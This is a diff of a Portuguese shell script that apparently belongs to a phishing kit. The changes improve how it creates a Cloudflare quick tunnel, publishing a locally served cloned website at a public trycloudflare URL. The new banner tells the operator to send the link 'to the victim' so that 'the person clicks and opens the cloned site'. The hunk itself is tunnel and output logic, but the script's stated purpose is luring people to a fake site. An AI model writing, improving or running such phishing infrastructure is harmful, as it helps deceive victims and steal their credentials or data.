@@ -312,20 +312,25 @@ SERVEREOF
     CF_URL=""
     if [ "$CF_CHOICE" = "1" ] && [ "$CF_INSTALLED" = true ]; then
         echo ""
-        echo "[...] Criando tunnel..."
+        echo "[...] Criando tunnel... aguarde..."
         echo ""
 
         cloudflared tunnel --url "http://localhost:$PORT" > /tmp/cf_tunnel.log 2>&1 &
         CF_PID=$!
 
-        sleep 5
-        CF_URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cf_tunnel.log | head -1)
+        # Esperar ate 15 segundos pela URL
+        for i in $(seq 1 15); do
+            sleep 1
+            CF_URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cf_tunnel.log 2>/dev/null | head -1)
+            if [ -n "$CF_URL" ]; then
+                break
+            fi
+        done
 
         if [ -n "$CF_URL" ]; then
             echo "[OK] Tunnel criado!"
         else
-            sleep 5
-            CF_URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cf_tunnel.log | head -1)
+            echo "[AVISO] Tunnel nao gerou URL em 15s. Verifique o cloudflared."
         fi
     fi
 
@@ -336,15 +341,13 @@ SERVEREOF
     echo "         SERVIDOR PRONTO!"
     echo "=========================================="
     echo ""
-    echo "  URL Local:  http://${IP}:${PORT}"
-    echo ""
     if [ -n "$CF_URL" ]; then
-        echo "  🔥 URL PUBLICA (funciona em QUALQUER lugar):"
+        echo "  🔥 URL PUBLICA (MANDE PRA VITIMA):"
         echo ""
         echo "    ${CF_URL}"
         echo ""
-        echo "  Mande esse link pra pessoa!"
-        echo "  Ela acessa de QUALQUER lugar do mundo."
+        echo "  Funciona de QUALQUER lugar do mundo!"
+        echo "  (a pessoa clica e abre o site clonado)"
     else
         echo "  Acesse de qualquer dispositivo na mesma rede:"
         echo "  http://${IP}:${PORT}"
